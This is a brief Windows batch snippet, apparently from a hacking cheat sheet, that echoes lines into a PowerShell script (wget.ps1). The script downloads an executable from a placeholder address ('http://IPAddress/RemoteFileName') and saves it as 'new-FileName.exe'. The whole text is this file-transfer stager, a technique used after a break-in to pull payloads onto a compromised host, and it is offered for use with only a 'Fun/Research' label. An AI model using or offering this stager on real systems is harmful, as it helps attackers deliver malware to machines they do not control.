echo # Creates a Wget Powershell Script > wget.ps1
echo # By: xG//05t >> wget.ps1
echo # Purpose: Fun/Research >> wget.ps1

echo #
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://IPAddress/RemoteFileName" >> wget.ps1
echo $file = "new-FileName.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1